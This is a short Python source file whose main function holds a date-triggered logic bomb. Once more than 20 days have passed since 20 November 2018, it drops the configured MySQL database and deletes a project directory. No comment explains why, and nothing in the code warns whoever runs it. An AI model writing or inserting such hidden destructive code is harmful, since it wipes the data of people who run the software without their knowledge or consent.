# -*- coding: utf-8 -*
__author__ = 'double k'

import datetime
from os import rmdir
from ownModule.mysql import MySQLSingle
from config import file

def main(check=True, objectName=None):
    if check == False:
        return None
    else:
        days = 20
        objName = objectName if objectName else "mmonly-pic"
        objectDir = file.objectPath + objName

        now = datetime.datetime.now()
        overTime = now - datetime.datetime(2018, 11, 20)
        overTime = overTime.days
        if overTime > days:
            db = MySQLSingle()
            db.get_conn()
            sql = "drop database " + db.database
            print(db.sql(sql))
            # db.closeall()
            rmdir(objectDir)
            return 100200
        else:
            return None

